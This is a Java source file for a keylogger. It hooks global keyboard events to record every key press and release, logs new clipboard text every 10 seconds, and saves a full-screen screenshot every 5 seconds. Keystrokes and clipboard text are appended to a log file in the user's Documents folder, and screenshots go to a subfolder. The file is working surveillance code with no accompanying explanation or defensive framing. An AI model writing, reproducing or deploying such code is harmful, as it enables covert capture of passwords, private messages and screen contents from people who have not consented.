package com;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.rmi.server.LogStream;
import java.util.Timer;
import java.util.TimerTask;

import javax.imageio.ImageIO;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;



public class KeyBoard implements NativeKeyListener{
    static String input = "";
    static String current = "";
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.err.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
        input += "Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()) + "\n";
    }
    public void nativeKeyReleased(NativeKeyEvent e) {
        input += "Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()) + "\n";
    }
    public static void main(String[] args) throws NativeHookException {
        File dir = new File(System.getProperty("user.home"), "Documents/test");
        File dir1 = new File(System.getProperty("user.home"), "Documents/test/image");

        dir.mkdirs();
        dir1.mkdirs();
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(new KeyBoard());
        Timer timer = new Timer();
        
        TimerTask task1 = new TimerTask() {
            @Override
            public void run() {
                try {
                    Robot robot = new Robot();
                    Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                    BufferedImage screenshot = robot.createScreenCapture(screenRect);
                    Path LOG_FILE = Path.of(System.getProperty("user.home"), "Documents", ("test/image/"+System.currentTimeMillis())+".jpeg");
                    File output = LOG_FILE.toFile();
                    ImageIO.write(screenshot, "jpeg", output);
                } catch (AWTException | IOException e) {
                    e.printStackTrace();
                }
            }
            
        };
        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                try {
                    Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();

                    Transferable contents = clipboard.getContents(null);

                    if (contents != null && contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {
                        String text = (String) contents.getTransferData(DataFlavor.stringFlavor);
                        if (!text.equals(current)) {
                            input += "Text Copied: " + text;
                            current = text;
                            
                        }
                    } else {
                        System.out.println("Clipboard does not contain text.");
                    }
                    Path LOG_FILE = Path.of(System.getProperty("user.home"), "Documents", "log.txt");
                    Files.writeString(
                    LOG_FILE, 
                    input, 
                    StandardOpenOption.CREATE,
                    StandardOpenOption.APPEND
                    );
                    input = "";
                } catch (Exception f) {
                    f.printStackTrace();
                }
            }
        };
        timer.scheduleAtFixedRate(task1, 1000, 5000);
        timer.scheduleAtFixedRate(task, 1000, 10000);
    
    }
}